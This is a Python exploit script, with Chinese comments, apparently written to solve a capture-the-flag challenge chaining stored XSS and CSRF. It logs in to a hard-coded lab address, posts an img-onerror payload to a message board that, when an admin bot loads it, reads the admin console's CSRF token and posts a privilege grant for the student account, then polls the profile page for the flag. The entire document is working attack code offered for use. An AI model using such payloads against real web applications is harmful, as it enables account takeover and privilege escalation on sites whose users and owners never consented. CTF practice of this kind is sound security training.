#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
17-csrf-xss-combo exploit script

流程：
1. student/student 登录
2. 往 /board 投放存储型 XSS
3. 等 admin bot 访问 /board
4. XSS 在 admin 上下文读取 /admin/console 的 csrf_token
5. XSS 携带 user=student + csrf_token 请求 /admin/grant
6. 本脚本轮询 /profile 提取 TOGOGO-flag{...}
"""

import re
import time
import requests

BASE_URL = "http://47.120.76.57:34097"
USERNAME = "student"
PASSWORD = "student"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")


def build_payload() -> str:
    # 使用 img onerror 触发，兼容评论区直接 HTML 渲染。
    # 注意：代码运行在 admin bot 的同源页面里，因此可以 fetch('/admin/console') 读取 token。
    return """<img src=x onerror="(async()=>{let h=await fetch('/admin/console',{credentials:'include'}).then(r=>r.text());let d=new DOMParser().parseFromString(h,'text/html');let t=d.querySelector('[name=csrf_token]')?.value||d.querySelector('#csrf_token')?.value||d.querySelector('#csrf_view')?.textContent;let p=new URLSearchParams();p.set('user','student');p.set('csrf_token',t);await fetch('/admin/grant',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p});})()">"""


def main() -> None:
    sess = requests.Session()

    print(f"[*] login as {USERNAME}/{PASSWORD}")
    r = sess.post(
        BASE_URL + "/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=False,
        timeout=10,
    )
    if r.status_code not in (302, 303):
        raise SystemExit(f"[-] login failed: HTTP {r.status_code}")
    print("[+] login ok")

    payload = build_payload()
    print(f"[*] post stored XSS payload, length={len(payload)}")
    r = sess.post(BASE_URL + "/board", data={"content": payload}, timeout=10)
    if r.status_code != 200:
        raise SystemExit(f"[-] post board failed: HTTP {r.status_code}")
    print("[+] payload stored")

    print("[*] wait admin bot and poll /profile ...")
    for i in range(1, 13):
        time.sleep(5)
        r = sess.get(BASE_URL + "/profile", timeout=10)
        m = FLAG_RE.search(r.text)
        print(f"    poll {i:02d}: HTTP {r.status_code}, flag={bool(m)}")
        if m:
            print("[+] FLAG:", m.group(0))
            return

    print("[-] flag not found yet. You can rerun or wait a little longer.")


if __name__ == "__main__":
    main()
